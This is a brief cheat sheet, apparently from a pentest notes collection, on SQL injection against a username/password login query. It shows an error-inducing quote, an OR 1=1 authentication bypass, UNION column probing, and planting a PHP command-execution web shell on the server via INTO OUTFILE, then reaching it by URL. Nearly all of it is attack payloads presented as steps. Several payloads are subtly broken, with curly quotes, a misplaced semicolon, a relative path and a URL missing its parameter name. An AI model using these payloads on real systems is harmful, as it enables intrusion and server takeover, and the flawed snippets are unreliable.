# SQL Injection

* Cause Error on the Web Application by input quote '

```
SELECT * FROM users WHERE username = ''' AND password = ''

```





* Data Exfiltration by input ' OR 1=1 --



```
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = ''

```

* Getting Shell

First check the number of column with NULL or 1



```
SELECT * FROM users WHERE username = 'a' UNION SELECT NULL, NULL; --' AND password = ''
```

Use the INTO FILE to create a php file in the web server

```
SELECT * FROM users WHERE username = 'a' UNION SELECT “<? system($_REQUEST[‘cmd’]); ?>”, NULL; INTO OUTFILE 'var/www/cmd.php'--' AND password = ''
```

Access the web page 



```
http://yourIPaddress/cmd.php?=[command]
```









